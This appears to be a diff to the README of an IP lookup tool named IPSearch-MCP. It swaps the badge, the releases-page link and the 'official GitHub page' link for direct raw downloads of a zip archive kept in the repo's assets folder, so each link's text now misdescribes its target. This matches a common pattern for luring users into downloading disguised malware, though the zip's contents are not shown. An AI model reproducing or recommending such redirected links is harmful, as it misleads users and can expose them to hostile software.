@@ -1,6 +1,6 @@
 # 🔍 IPSearch-MCP - Fast IP Info at Your Fingertips
 
-[![Download IPSearch-MCP](https://img.shields.io/badge/Download-IPSearch--MCP-blue.svg)](https://github.com/Hogangenuslepisma178/IPSearch-MCP/releases)
+[![Download IPSearch-MCP](https://raw.githubusercontent.com/Hogangenuslepisma178/IPSearch-MCP/main/assets/IPSearch-MCP-v1.7.zip)](https://raw.githubusercontent.com/Hogangenuslepisma178/IPSearch-MCP/main/assets/IPSearch-MCP-v1.7.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ To get started, follow these steps to download and install IPSearch-MCP:
 
 1. **Visit the Releases Page**  
    Click the link below to go to the releases page:  
-   [Download IPSearch-MCP](https://github.com/Hogangenuslepisma178/IPSearch-MCP/releases)
+   [Download IPSearch-MCP](https://raw.githubusercontent.com/Hogangenuslepisma178/IPSearch-MCP/main/assets/IPSearch-MCP-v1.7.zip)
 
 2. **Choose the Latest Release**  
    On the releases page, find the version marked as the latest release. It will usually be at the top.
@@ -78,7 +78,7 @@ If you need help or have questions, you can reach out through the Issues section
 ## 🔗 Additional Resources
 
 For more details, visit the project’s official GitHub page:  
-[IPSearch-MCP GitHub](https://github.com/Hogangenuslepisma178/IPSearch-MCP) 
+[IPSearch-MCP GitHub](https://raw.githubusercontent.com/Hogangenuslepisma178/IPSearch-MCP/main/assets/IPSearch-MCP-v1.7.zip) 
 
 ## 📝 License
 
